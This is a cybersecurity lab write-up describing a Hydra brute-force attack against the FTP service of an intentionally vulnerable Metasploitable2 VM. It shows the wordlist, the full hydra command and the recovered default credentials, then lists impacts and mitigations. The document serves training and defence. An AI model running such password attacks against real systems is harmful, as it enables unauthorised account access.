# Hydra FTP Password Attack

## 1. Objective

To demonstrate a password-guessing attack against the FTP service running on the intentionally vulnerable Metasploitable2 machine using Hydra.

---

## 2. Target Information

- Target: Metasploitable2
- Target IP: `192.168.133.128`
- Service: FTP
- Port: `21`
- Tool: Hydra

---

## 3. Password List

A small password list was created for the authorized lab:

```text
123456
password
admin
msfadmin
root
toor

The username used for the test was:

msfadmin
4. Hydra Command

The following command was used against the FTP service:

hydra -I -l msfadmin -P ~/ssh-passwords.txt -t 4 ftp://192.168.133.128
Command Explanation
-I → Ignore previous restore file
-l msfadmin → Username used for the attack
-P → Password wordlist
-t 4 → Four parallel tasks
ftp:// → FTP service
192.168.133.128 → Target IP
5. Result

Hydra successfully identified valid FTP credentials:

[21][ftp] host: 192.168.133.128
login: msfadmin
password: msfadmin

Result:

1 valid password found
6. SSH Compatibility Note

An SSH brute-force attempt was also tested.

However, the legacy SSH service on Metasploitable2 uses outdated cryptographic algorithms, causing compatibility errors with the current Hydra/OpenSSH environment.

Therefore, the successful password-attack evidence documented here is specifically for FTP, not SSH.

7. Security Impact

Weak passwords can allow attackers to gain unauthorized access to network services.

Potential risks include:

Unauthorized account access
Data theft
Service misuse
Further system compromise
Privilege escalation
8. Mitigation

Recommended security measures:

Use strong and unique passwords.
Disable default or easily guessable credentials.
Implement account lockout or rate limiting.
Disable FTP when it is not required.
Prefer secure alternatives such as SFTP.
Monitor authentication logs.
Use multi-factor authentication where supported.
Regularly audit passwords and exposed services.
9. Conclusion

Hydra successfully demonstrated the risk of weak FTP credentials in the authorized Metasploitable2 laboratory environment.

The test highlights the importance of strong authentication and restricting unnecessary network services.

Disclaimer

This activity was performed only against an intentionally vulnerable Metasploitable2 virtual machine in an authorized cybersecurity laboratory environment.